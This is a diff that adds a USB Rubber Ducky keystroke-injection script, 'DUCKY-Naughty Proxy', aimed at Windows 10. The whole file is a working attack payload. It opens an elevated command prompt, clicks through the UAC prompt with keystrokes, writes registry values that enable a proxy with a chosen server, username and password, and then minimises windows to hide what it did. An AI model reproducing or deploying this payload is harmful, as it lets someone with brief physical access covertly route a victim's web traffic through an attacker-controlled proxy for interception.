@@ -1,0 +1,34 @@
+REM Title: DUCKY-Naughty Proxy (no existing proxy)
+REM Description: This payload adds a proxy address and authentication details to the registry & enables the proxy settings
+REM Note: Requires the user to have local administrator rights & no prior proxy information
+REM Author: Unit98.1
+REM Target: Windows 10 
+
+DELAY 6969
+
+GUI r
+DELAY 420
+STRING cmd
+DELAY 420
+CTRL-SHIFT ENTER
+DELAY 690
+TAB
+DELAY 420
+TAB
+DELAY 420
+ENTER
+
+DELAY 690
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1
+ENTER
+DELAY 999
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d name:port
+ENTER
+DELAY 999
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyUser /t REG_SZ /d username
+ENTER
+DELAY 999
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyPass /t REG_SZ /d password
+ENTER
+DELAY 999
+GUI m
